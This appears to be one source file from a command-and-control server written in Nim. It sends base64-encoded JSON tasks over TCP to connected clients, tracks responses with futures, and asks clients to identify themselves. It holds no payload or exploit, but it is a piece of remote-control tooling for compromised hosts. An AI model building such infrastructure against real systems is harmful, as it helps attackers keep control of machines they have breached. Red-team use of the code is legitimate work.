import asyncdispatch, asyncnet, base64, json

import types

proc sendClientTask*(client: C2Client, pl: string) {.async.} =
  if client.listenerType == "tcp":
    let tcpSocket: TCPSocket = client.getTcpSocket()
    await tcpSocket.socket.send(encode($pl) & "\r\n")

proc awaitResponse*(client: C2Client) {.async.} =
    if client.server.clRespFuture[].isNil():
        client.server.clRespFuture[] = newFuture[void]()
    await client.server.clRespFuture[]

proc completeResponse*(client: C2Client) {.async.} =
    if not client.server.clRespFuture.isNil():
        client.server.clRespFuture[].complete()
        client.server.clRespFuture[] = nil

proc askToIdentify*(client: C2Client) {.async.} =
    let j = %*
        {
            "task": "identify"
        }
    await client.sendClientTask($j)
